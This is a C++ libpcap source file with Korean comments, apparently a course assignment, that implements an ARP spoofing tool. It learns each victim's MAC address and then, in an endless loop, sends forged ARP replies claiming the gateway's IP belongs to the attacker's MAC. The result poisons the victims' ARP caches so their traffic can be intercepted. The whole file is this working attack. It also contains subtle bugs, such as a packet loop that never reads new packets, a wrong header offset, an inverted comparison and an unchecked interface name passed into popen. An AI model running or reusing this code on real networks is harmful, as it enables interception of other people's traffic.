#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"        //eth mac& ip info
#include "arphdr.h"        //arp mac& ip info
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>			//sleep()

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)
// 맨처음 입력받은 매개변수들을 저장할 구조체
typedef struct{
    char sen_ip[100];
    char target_ip[100];
} ip_group;
// ip 와 mac을 저장할 구조체 선언 (본문에서 2개의 구조체로 활용)
typedef struct{
    char ip[100];
    char mac[100];
} address_group;

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

typedef struct {
	char* dev_;
} Param;

Param param = {
	.dev_ = NULL
};

bool parse(Param* param, int argc, char* argv[]) {
	if (argc != 2) {
		usage();
		return false;
	}
	param->dev_ = argv[1];
	return true;
}
//interface = dev , my_ip & my_mac에 값을 저장할 수 있도록 함수 선언
void get_my_address(const char* interface, char* my_ip, char* my_mac) {
    char command[100];
    char buffer[1024];
    //command 문자열에 값을 넣어 커맨드를 실행시키고 해당 값을 받아온다.
    sprintf(command, "ifconfig %s", interface);
    FILE* command_result = popen(command, "r");
    if (command_result == nullptr) {
        printf("ERROR: Failed to load data used interface");
        return;
    }
    //한 줄씩 받아와서 inet 과 ether 이 시작하는 위치부터 공백이 나올때까지 받아서 저장한다.
    while (fgets(buffer, sizeof(buffer), command_result) != nullptr) {
    	// inet6 값이 나오지 않도록 비교구문 추가
        if (strstr(buffer, "inet") != nullptr && strstr(buffer, "inet6") == nullptr) {
            char* start = strstr(buffer, "inet") + strlen("inet ");
            char* end = strchr(start, ' ');
            if (end != nullptr) {
                *end = '\0';
                strcpy(my_ip, start);
            }
        }
        if (strstr(buffer, "ether ") != nullptr) {
            char* start = strstr(buffer, "ether ") + strlen("ether ");
            char* end = strchr(start, ' ');
            if (end != nullptr) {
                *end = '\0';
                strcpy(my_mac, start);
            }
        }
    }
    pclose(command_result);
}
// dev, attacker ip(my ip), attacker mac(my mac), sender ip 를 이용하여 request 요청을 보낸다.
void Sender_mac_request(const char* dev,const char* attacker_ip ,const char* attacker_mac, const char * sender_ip){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
		EthArpPacket packet;

	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.eth_.smac_ = Mac(attacker_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(attacker_mac);
	packet.arp_.sip_ = htonl(Ip(attacker_ip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(sender_ip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	pcap_close(handle);
}
// check_attaker_ip(my.ip), check_sender_ip(입력받은 sender.ip) 값이 아래 패킷을 통해 받아온 ip값과 같은지 비교하고 같다면 sender_mac을 저장한다.
void get_packet(const char* check_attacker_ip, const char* check_sender_ip,char* sender_ip ,char* sender_mac){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
	struct pcap_pkthdr* header;
	const u_char* packet;
	int res = pcap_next_ex(pcap, &header, &packet);
	// if (res == 0) continue;
	if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
		printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
		return;
	}
	
	while(true){
		struct EthHdr *eth_hdr = (struct EthHdr *) packet;
	    struct ArpHdr *arp_hdr = (struct ArpHdr *) (packet+16);
	    char target_ip[20];
	    char target_mac[20];
	    if (eth_hdr->type() != eth_hdr->Arp) {
	           continue;
	    }
	    // reply : sip is sender, target is  tip
	    uint32_t s_ip = uint32_t(arp_hdr->sip());
	    uint8_t* s_mac = (uint8_t*)(arp_hdr->smac());
	    uint32_t t_ip = uint32_t(arp_hdr->tip());
	    uint8_t* t_mac = (uint8_t*)(arp_hdr->tmac());
	    
	    sprintf(target_ip, "%u.%u.%u.%u",(t_ip >> 24), (t_ip >> 16) % 0x100, (t_ip >> 8) % 0x100, t_ip % 0x100);
	    sprintf(target_mac, "%02x:%02x:%02x:%02x:%02x:%02x", t_mac[0],t_mac[1],t_mac[2],t_mac[3],t_mac[4],t_mac[5]);
	    sprintf(sender_ip, "%u.%u.%u.%u",(s_ip >> 24), (s_ip >> 16) % 0x100, (s_ip >> 8) % 0x100, s_ip % 0x100);
	    sprintf(sender_mac, "%02x:%02x:%02x:%02x:%02x:%02x", s_mac[0],s_mac[1],s_mac[2],s_mac[3],s_mac[4],s_mac[5]);
		//sender_ip == attacker(my.ip)와 target_ip(sender.ip) 확인하여 맞으면 리턴 아니면 반복 진행
	    if (strcmp(check_attacker_ip,sender_ip) && strcmp(check_sender_ip,target_ip)){
	    	return;
	    }
	}
}
void arp_reply_attack(const char* dev ,const char* attacker_mac, const char * sender_ip, const char* sender_mac, const char* target_ip){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
		EthArpPacket packet;

	packet.eth_.dmac_ = Mac(sender_mac);
	packet.eth_.smac_ = Mac(attacker_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(attacker_mac);
	packet.arp_.sip_ = htonl(Ip(target_ip));
	packet.arp_.tmac_ = Mac(sender_mac);
	packet.arp_.tip_ = htonl(Ip(sender_ip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	pcap_close(handle);
}


int main(int argc, char* argv[]) {
    if (argc% 2 != 0 || argc ==2) {
        usage();
        return -1;
    }

    // argv[1] is eth0 ???
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    pcap_close(handle);

    // 매개변수 지정을 위한 사이즈 지정
    int memory_size = (argc - 2) / 2;
    // 입력 받은 매개변수를 저장하기 위한 메모리 선언
    ip_group* Ip_group = (ip_group*)malloc(sizeof(ip_group) * memory_size);

    int i, j;
    for (i = 2, j = 0; i < argc; i += 2, j++) {
        char* sen_ip    = argv[i];
        char* target_ip    = argv[i + 1];
        strcpy(Ip_group[j].sen_ip, sen_ip);
        strcpy(Ip_group[j].target_ip, target_ip);
    }
    // get_my_address로 얻을 Attacker의 ip & mac 을 저장할 구조체 선언
    address_group my_address;
    // get_packet으로 얻을 sender의 mac과 해당하는 ip를 저장할 구조체 선언
    address_group* sender_address = (address_group*)malloc(sizeof(address_group)*memory_size);
 
    get_my_address(dev, my_address.ip, my_address.mac);
    printf("my ip : %s\nmy Mac : %s\n", my_address.ip, my_address.mac);
    // reapeat arp attack
    while(true){
    	for (int i =0 ; i<memory_size; i++){
    	Sender_mac_request(dev,my_address.ip, my_address.mac, Ip_group[i].sen_ip);
	    // my_address.ip => attacker_ip; Ip_group[i].sen_ip => i번째 입력받은 sender_ip ;
	    // sender_address[i].ip; sender_address[i].mac => 선언한 i번째 구조체의  (현재 값은 없음 -> 함수에서 값을 받아옴)
	    get_packet(my_address.ip, Ip_group[i].sen_ip,sender_address[i].ip, sender_address[i].mac);
	    printf("the number of factors: %d\nget sender ip: %s\nsender_mac : %s\n", i,sender_address[i].ip, sender_address[i].mac);
	    // dev(eth0), my_address.mac(attacker_mac); sender_address[i].ip와 mac (i번째의 sender ip와 mac) ; Ip_group[i].target_ip (입력받은 i번째 gateway의 ip)
	    arp_reply_attack(dev,my_address.mac,sender_address[i].ip,sender_address[i].mac,Ip_group[i].target_ip);
	    printf("ARP ATTACK IS SUCCESSES\n");
	    sleep(1);	// 연속으로 계속 실행될 경우, 패킷이 제대로 받아오지 않아 1초간 sleep 지정
    	}
    	printf("Complete parameters.\nProceed with the iteration.\n");
    }
    // malloc cat is free
    free(sender_address);
    free(Ip_group);
    return 0;
}
